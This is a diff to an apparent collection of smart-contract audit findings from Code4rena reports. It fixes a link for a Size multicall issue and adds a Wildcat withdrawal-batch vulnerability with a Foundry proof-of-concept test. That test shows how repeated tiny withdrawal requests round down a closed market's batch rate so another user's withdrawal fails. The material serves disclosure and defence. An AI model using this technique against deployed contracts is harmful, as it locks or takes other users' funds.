@@ -2442,7 +2442,7 @@ function test_discount_drain() public {
 - Summary: The multicall function in the Size.sol contract allows users to perform multiple protocol actions, such as depositing and repaying in a single transaction, while bypassing token caps. However, a specific invariant is violated when borrowAToken supply increases more than the decrease in debtToken supply, resulting in unintended behavior.
 
 - Impact & Recommendation: Replace borrowAToken.balanceOf(address(this)) with borrowAToken.totalSupply() in the multicall function to ensure proper supply tracking and revert the transaction when the invariant is broken.
-  <br> 🐬: [Source](https://code4rena.com/reports/2024-06-size#m-01-Multicall does not work as intended) & [Report](https://code4rena.com/reports/2024-06-size)
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-06-size#m-01-Multicall-does-not-work-as-intended) & [Report](https://code4rena.com/reports/2024-06-size)
 
 <details><summary>POC</summary>
 
@@ -2505,6 +2505,52 @@ library Multicall {
         state.data.isMulticall = false;
     }
 }
+
+```
+
+</details>
+
+## 27.[High] User could withdraw more than supposed to, forcing last user withdraw to fail
+
+### Withdraw batches
+
+- Summary: If the market is closed, the batching process can lead to a scenario where users withdraw more than they should, resulting in insufficient funds for later withdrawals. Specifically, after users initiate a large withdrawal and executes it at a higher rate before other requests are added, users' multiple small requests can reduce the batch rate due to precision loss, depleting the batch funds. Consequently, when other users attempt their withdrawal, it fails due to insufficient `normalizedUnclaimedWithdrawals`. This issue, which can be exploited to intentionally cause rounding down in closed markets, breaks the core invariant that the sum of withdrawals should not exceed `batch.normalizedAmountPaid`.
+
+- Impact & Recommendation: add a function to adjust `state.normalizedUnclaimedRewards` post-closure, ensuring users don’t lose funds permanently.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-08-wildcat#h-01-user-could-withdraw-more-than-supposed-to-forcing-last-user-withdraw-to-fail) & [Report](https://code4rena.com/reports/2024-08-wildcat)
+
+<details><summary>POC</summary>
+
+```solidity
+
+  function test_deadrosesxyzissue() external {
+    parameters.annualInterestBips = 3650;
+    _deposit(alice, 1e18);
+    _deposit(bob, 0.5e18);
+    address laurence = address(1337);
+    _deposit(laurence, 0.5e18);
+    fastForward(200 weeks);
+    vm.startPrank(borrower);
+    asset.approve(address(market), 10e18);
+    asset.mint(borrower, 10e18);
+    vm.stopPrank();
+    vm.prank(alice);
+    uint32 expiry = market.queueFullWithdrawal();       // alice queues large withdraw
+    vm.prank(borrower);
+    market.closeMarket();                               // market is closed
+    market.executeWithdrawal(alice, expiry);     // alice withdraws at the current rate
+    vm.startPrank(bob);
+    for (uint i; i < 10; i++) {
+      market.queueWithdrawal(1);        // bob does multiple small withdraw requests just so they round down the batch's overall rate
+    }
+    market.queueFullWithdrawal();
+    vm.stopPrank();
+    vm.prank(laurence);
+    market.queueFullWithdrawal();
+    market.executeWithdrawal(bob, expiry);     // bob can successfully withdraw all of his funds
+    vm.expectRevert();
+    market.executeWithdrawal(laurence, expiry);    // laurence cannot withdraw his funds. Scammer get scammed.
+  }
 
 ```
 
